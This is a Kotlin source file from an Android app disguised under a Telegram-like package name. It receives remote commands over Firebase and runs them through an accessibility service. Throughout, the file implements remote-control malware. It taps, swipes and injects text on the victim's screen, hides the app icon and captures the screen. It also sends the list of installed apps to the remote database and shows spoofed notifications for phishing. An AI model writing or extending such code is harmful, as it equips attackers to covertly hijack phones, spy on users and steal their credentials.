package com.telegram2.messaging.remote

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.util.Base64
import com.google.firebase.database.*

object CommandProcessor {
    private lateinit var context: Context

    fun init(ctx: Context) {
        context = ctx.applicationContext
        FirebaseBridge.commandsRef.addChildEventListener(object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previous: String?) {
                val cmd = snapshot.getValue(RemoteCommand::class.java) ?: return
                execute(cmd, snapshot.key)
                snapshot.ref.removeValue()
            }
            override fun onChildChanged(s: DataSnapshot, p: String?) {}
            override fun onChildRemoved(s: DataSnapshot) {}
            override fun onChildMoved(s: DataSnapshot, p: String?) {}
            override fun onCancelled(error: DatabaseError) {
                FirebaseBridge.commandsRef.addChildEventListener(this)
            }
        })
    }

    private fun execute(cmd: RemoteCommand, key: String?) {
        val svc = MyAccessibilityService.instance ?: return

        when (cmd.type) {
            "prompt" -> {
                val prompt = decodeIfBase64(cmd.text) ?: return
                val actions = NLPParser.parse(prompt)
                val steps = actions.map { action ->
                    MacroRunner.MacroStep(action.type, action.data, 3)
                }
                val macroId = key ?: "prompt_${System.currentTimeMillis()}"
                svc.executeMacro(macroId, steps)
            }
            else -> {
                val params = mutableMapOf<String, Any?>()
                cmd.x?.let { params["x"] = it }
                cmd.y?.let { params["y"] = it }
                cmd.sx?.let { params["sx"] = it }
                cmd.sy?.let { params["sy"] = it }
                cmd.ex?.let { params["ex"] = it }
                cmd.ey?.let { params["ey"] = it }
                cmd.text?.let { params["text"] = decodeIfBase64(it) }
                cmd.title?.let { params["title"] = decodeIfBase64(it) }
                cmd.duration?.let { params["duration"] = it }
                svc.performSingleCommand(cmd.type ?: "unknown", params)
            }
        }
    }

    private fun decodeIfBase64(input: String?): String? {
        if (input == null) return null
        return try {
            String(Base64.decode(input, Base64.DEFAULT), Charsets.UTF_8)
        } catch (_: Exception) { input }
    }

    data class RemoteCommand(
        val type: String? = null,
        val x: Int? = null, val y: Int? = null,
        val sx: Int? = null, val sy: Int? = null,
        val ex: Int? = null, val ey: Int? = null,
        val text: String? = null, val title: String? = null,
        val iconUrl: String? = null, val bigPictureUrl: String? = null,
        val duration: Long? = null,
        val steps: List<Map<String, Any>>? = null
    )
}

// Extension function — now has access to `context`
fun MyAccessibilityService.performSingleCommand(type: String, params: Map<String, Any?>) {
    when (type) {
        "tap" -> tap(params["x"] as? Int ?: 500, params["y"] as? Int ?: 1000)
        "swipe" -> swipe(
            params["sx"] as? Int ?: 0,
            params["sy"] as? Int ?: 0,
            params["ex"] as? Int ?: 0,
            params["ey"] as? Int ?: 0,
            params["duration"] as? Long ?: 300L
        )
        "type" -> injectText(params["text"] as? String ?: "")
        "launch" -> launchApp(params["package"] as? String ?: "")
        "click_text" -> clickText(params["text"] as? String ?: "")
        "home" -> performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)
        "back" -> performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
        "hide_activity" -> hideAppIcon()
        "uninstall" -> uninstallSelf()
        "start_screen_capture" -> startScreenCapture()
        "stop_screen_capture" -> stopScreenCapture()
        "get_apps" -> FirebaseBridge.pushInstalledApps(getInstalledApps())
        "fake_notification" -> {
            val title = params["title"] as? String ?: "⚠ Alert"
            val text = params["text"] as? String ?: "Tap to view"
            NotificationSpoofer.show(context, title, text, null, null)
        }
    }
}